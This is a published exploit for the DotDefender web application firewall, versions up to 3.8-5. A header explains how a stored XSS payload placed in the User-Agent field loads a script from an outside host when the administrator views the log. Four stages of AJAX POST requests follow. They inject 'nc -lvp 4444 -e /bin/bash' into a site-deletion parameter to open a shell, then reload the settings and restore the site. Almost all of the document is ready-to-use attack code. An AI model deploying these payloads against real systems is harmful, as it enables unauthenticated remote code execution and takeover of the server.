/***********************************************************************
DotDefender <= 3.8-5 No Authentication Remote Code Execution Through XSS
Tested on DotDefender 3.8-5 On Ubuntu Server 9.10 64-bit with Firefox 3.6.3
Paul Hand aka rAWjAW ( AT ) offsec.com
Original Post-Authentication Remote Command Execution Vulnerability: http://www.exploit-db.com/exploits/10261 (Author: John Dos)

This is a multi-staged attack against DotDefender through the use of ASRF (or as I call it AJAX Site Request Forgery).  To begin, I must give credit to John Dos who discovered a still un-patched post-authentication remote-code execution vulnerability.  This vulnerability will be used in this attack, but we are taking this from  post-authentication to a no-authentication attack..

DotDefender uses HTTP Basic Auth to secure its management interface, which is comprised of CGI scripts which in turn run perl scrips on the back end.  The first vulnerability lies within the Administrative Web Interface of DotDefender.  If you take a look at a certain event that has occured, there are three sections which are available to the administrator.  The top first section is the Event Details, which outlines things such as the rule that was triggerd, by whom, the applied policy, etc.  The next section shows the HTTP Headers that were given when this attack was logged.  The last section shows the Matching Data Length and the offending string, which is highlighted in Yellow.  The flaw here is that there is no proper santization of the information that is presented to the administrator in the HTTP Headers section of the application.

The caveot of this attack is that DotDefender's Administrative Interface can not be run without javascript  nor does the User-Agent field have a size limit.  The most I tried was a 6000 character User-Agent field (in which you can put almost anything with that amount of space) and all of the information was still available.

For this attack to work, you must first trigger DotDefender to log your activity and then simply have the DotDefender administrator look at the log you created.  This is can be done with anything that DotDefender blocks such as Cross-Site Scripting or SQL Injection, then you simply modify your User-Agent field to include your script such as:
<script language="JavaScript" src="http://MySite.com/DotDefender.js"></script>
************************************************************************/

//This is the first stage of the attack. What this stage does is creates an AJAX POST request to the index.cgi page with the parameters to delete a server from the list.  This is where John Dos's vulnerability comes into to play.  Since we are executing this script using AJAX and we can send the proper POST parameters to the index page, there is no need to bypass the HTTP Basic Auth that is used, since this will all be running as the administrator of DotDefender.  This example opens a netcat listener on port 4444 (which when tested on Ubuntu Server 9.10, has the -e option available).  The only thing that must be changed is the site.com name to correspond to the site that is being protected by DotDefender.

var http = new XMLHttpRequest();
var url = "../index.cgi";
var params = "sitename=site.com&deletesitename=site.com;nc -lvp 4444 -e /bin/bash;&action=deletesite&linenum=14";
http.open("POST",url,true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.setRequestHeader("Content-lenth", params.length);
http.setRequestHeader("Connection","close");

http.conreadystatechange = function() {
	if(http.readyState == 4 && http.status == 200) {
		alert(http.responseText);
		}
}
http.send(params);


//This is the second stage of the attack.  DotDefender required the administrator to "Refresh the Settings" of the Web Application Firewall after a site has been deleted.

var http2 = new XMLHttpRequest();
var params2 = "action=reload&cursite=&servgroups=&submit=Refresh_Settings";
http2.open("POST",url,true);
http2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http2.setRequestHeader("Content-lenth", params2.length);
http2.setRequestHeader("Connection","close");

http2.conreadystatechange = function() {
	if(http2.readyState == 4 && http2.status == 200) {
		alert(http2.responseText);
		}
}
http2.send(params2);


//This is the third stage of the attack.  Since the code-execution vulnerability required the site to be deleted from DotDefender, the site must now be added back into the list.

var http3 = new XMLHttpRequest();
var params3 = "newsitename=site.com&action=newsite";
http3.open("POST",url,true);
http3.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http3.setRequestHeader("Content-lenth", params3.length);
http3.setRequestHeader("Connection","close");

http3.conreadystatechange = function() {
	if(http3.readyState == 4 && http3.status == 200) {
		alert(http3.responseText);
		}
}
http3.send(params3);


//This is the fourth and final stage of the attack.  The site has beed added back into the list but once again the administrator needs to "Refresh the Settings". 

var http4 = new XMLHttpRequest();
var params4 = "action=reload&cursite=&servgroups=&submit=Refresh_Settings";
http4.open("POST",url,true);
http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http4.setRequestHeader("Content-lenth", params4.length);
http4.setRequestHeader("Connection","close");

http4.conreadystatechange = function() {
	if(http4.readyState == 4 && http4.status == 200) {
		alert(http4.responseText);
		}
}
http4.send(params4);